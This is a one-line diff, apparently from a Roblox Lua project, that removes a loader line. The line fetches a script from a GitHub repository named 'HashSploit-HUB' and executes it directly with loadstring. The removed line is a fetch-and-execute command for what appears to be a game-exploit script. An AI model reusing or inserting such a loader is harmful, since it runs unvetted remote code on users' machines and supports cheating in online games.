@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hashkiller/HashSploit-HUB/main/rage-simulator.lua"))()
